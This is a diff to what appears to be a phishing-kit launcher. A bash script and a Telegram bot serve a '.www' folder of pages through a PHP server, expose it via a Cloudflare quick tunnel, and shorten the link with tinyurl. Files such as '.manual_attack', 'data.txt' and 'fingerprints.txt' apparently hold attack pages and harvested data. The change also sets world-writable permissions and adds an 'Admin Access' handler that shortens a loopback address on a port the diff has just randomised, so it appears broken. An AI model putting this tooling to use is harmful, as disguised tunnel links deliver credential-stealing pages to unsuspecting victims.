@@ -30,15 +30,15 @@ install_packages_and_libraries() {
 
     echo -e "\n[+] Creating Python virtual environment..."
     virtualenv venv
-    source venv/bin/activate
 
-    echo -e "\n[+] Installing required Python libraries..."
+    echo -e "\n[+] Activating virtual environment and installing required Python libraries..."
+    source venv/bin/activate
     pip install telepot requests
 }
 
 # Function to set permissions for necessary files and directories
 set_permissions() {
-    chmod -R 777 packages.sh tunnels.sh data.txt fingerprints.txt .host .manual_attack .music .pages .tunnels_log .www
+    chmod -R 777 packages.sh tunnels.sh data.txt fingerprints.txt .host .manual_attack .pages .tunnels_log .www
 }
 
 # Function to create necessary directories
@@ -71,21 +71,24 @@ EOL
 
 # Function to start PHP server
 start_php_server() {
-    cd .www && php -S 127.0.0.1:8080 > /dev/null 2>&1 &
+    RANDOM_PORT=$(( ( RANDOM % 63000 ) + 2000 ))
+    cd .www && php -S 127.0.0.1:$RANDOM_PORT > /dev/null 2>&1 &
+    echo $RANDOM_PORT > .tunnels_log/port.log
 }
 
 # Function to start Cloudflared tunnel and shorten URL
 start_cloudflared() {
-    echo -ne "\nStarting Cloudflared..."
+    RANDOM_PORT=$(cat .tunnels_log/port.log)
+    echo -ne "\nStarting Cloudflared on port $RANDOM_PORT..."
     if [[ $(command -v termux-chroot) ]]; then
-        termux-chroot ./.host/cloudflared tunnel -url http://127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
+        termux-chroot ./.host/cloudflared tunnel -url http://127.0.0.1:$RANDOM_PORT > .tunnels_log/.cloudfl.log 2>&1 &
     else
-        ./.host/cloudflared tunnel -url http://127.0.0.1:8080 > .tunnels_log/.cloudfl.log 2>&1 &
+        ./.host/cloudflared tunnel -url http://127.0.0.1:$RANDOM_PORT > .tunnels_log/.cloudfl.log 2>&1 &
     fi
 
     sleep 12
     cldflr_url=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .tunnels_log/.cloudfl.log)
-    shortened_url=$(curl -s https://clck.ru/--\?url\=${cldflr_url})
+    shortened_url=$(curl -s http://tinyurl.com/api-create.php?url=${cldflr_url})
 
     echo -e "\nCloudflared URL: ${cldflr_url}"
     echo -e "\nShortened URL: ${shortened_url}"
@@ -133,7 +136,8 @@ def handle(msg):
             bot.sendMessage(chat_id, 'Welcome to the Cloudflare Manager Bot! Press a button:', reply_markup=ReplyKeyboardMarkup(
                 keyboard=[
                     [KeyboardButton(text='Start Tunnel'), KeyboardButton(text='Stop Tunnel')],
-                    [KeyboardButton(text='Get Tunnel URL'), KeyboardButton(text='Update Bot')]
+                    [KeyboardButton(text='Get Tunnel URL'), KeyboardButton(text='Admin Access')],
+                    [KeyboardButton(text='Update Bot')]
                 ]
             ))
         elif command == 'Start Tunnel':
@@ -142,19 +146,22 @@ def handle(msg):
             stop_tunnel(chat_id)
         elif command == 'Get Tunnel URL':
             get_tunnel_url(chat_id)
+        elif command == 'Admin Access':
+            admin_access(chat_id)
         elif command == 'Update Bot':
             update_bot(chat_id)
 
 def start_tunnel(chat_id):
     global tunnel_process
     bot.sendMessage(chat_id, "Starting Cloudflared tunnel...")
-    tunnel_process = subprocess.Popen(['./.host/cloudflared', 'tunnel', '-url', 'http://127.0.0.1:8080'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    tunnel_process = subprocess.Popen(['./start.sh'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     time.sleep(10)
     bot.sendMessage(chat_id, "Tunnel started.")
 
 def stop_tunnel(chat_id):
     global tunnel_process
     if tunnel_process:
+        subprocess.Popen(['./stop.sh'])
         tunnel_process.terminate()
         bot.sendMessage(chat_id, "Tunnel stopped.")
     else:
@@ -165,10 +172,18 @@ def get_tunnel_url(chat_id):
         with open('.tunnels_log/.cloudfl.log', 'r') as log_file:
             log_contents = log_file.read()
         cldflr_url = re.search(r'https://[-0-9a-z]*\.trycloudflare.com', log_contents).group(0)
-        shortened_url = requests.get(f"https://clck.ru/--?url={cldflr_url}").text
+        shortened_url = requests.get(f"http://tinyurl.com/api-create.php?url={cldflr_url}").text
         bot.sendMessage(chat_id, f"Cloudflared URL: {cldflr_url}\nShortened URL: {shortened_url}")
     except Exception as e:
         bot.sendMessage(chat_id, f"Error retrieving URL: {e}")
+
+def admin_access(chat_id):
+    try:
+        admin_url = 'http://127.0.0.1:8080/admin'
+        shortened_admin_url = requests.get(f"http://tinyurl.com/api-create.php?url={admin_url}").text
+        bot.sendMessage(chat_id, f"Admin Panel URL: {shortened_admin_url}")
+    except Exception as e:
+        bot.sendMessage(chat_id, f"Error generating admin URL: {e}")
 
 def update_bot(chat_id):
     bot.sendMessage(chat_id, "Updating bot... (Functionality under construction)")
